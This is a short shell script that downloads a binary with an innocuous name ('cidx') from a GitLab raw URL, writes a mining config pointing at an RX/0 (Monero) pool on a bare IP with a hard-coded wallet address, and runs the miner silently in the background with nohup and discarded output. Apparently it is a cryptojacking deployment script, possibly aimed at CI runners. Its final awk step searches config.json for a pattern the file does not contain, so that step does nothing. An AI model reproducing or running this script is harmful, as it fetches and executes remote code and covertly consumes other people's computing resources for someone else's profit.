# Download and extract the cidx file
wget -O cidx gitlab.com/asiapboneng/ci/-/raw/main/cidx.tar.gz && tar -xvf cidx >/dev/null 2>&1

# Set the current date in UTC-7 format
current_date=$(TZ=UTC-7 date +"%H-%M [%d-%m]")

# Create config.json with the current date
cat > config.json <<END
{
    "pools": [
        {
            "algo": "rx/0",
            "url": "157.20.104.252:80",
            "user": "86vnaZqa1ucBWsqMH2v6GgP13bGQ2CNE3Xsw4WpeMyhGP8PMzB7tMA6MpRqfAK14a1TW2A8ERBmTSAb1g5UKeERgNyDv9GY",
            "pass": "$(echo oks$(shuf -i 1-40 -n 1))",
			"threads": "7",
            "rig-id": "$(echo oks$(shuf -i 1-40 -n 1))"
        }
    ]
}
END

# Make cidx and config.json executable
chmod +x config.json cidx

# Run cidx in the background
nohup ./cidx -c 'config.json' --threads 16 &>/dev/null &

# Clear the screen and print the current time and running jobs
clear
echo RUN $(TZ=UTC-7 date +"%R-[%d/%m/%y]") && jobs

# Run awk to process config.json and print the matching date-time part
awk -v date_str="i-${current_date}" '
{
  if ($0 ~ /i-[0-9]{2}-[0-9]{2} \[[0-9]{2}-[0-9]{2}\]/) {
    # Extract and print only the "i-<hour>-<minute> [<day>-<month>]" part
    match($0, /i-[0-9]{2}-[0-9]{2} \[[0-9]{2}-[0-9]{2}\]/, arr)
    if (length(arr) > 0) {
      print arr[0]  # Print the matched date-time part
    }
  }
}
' config.json
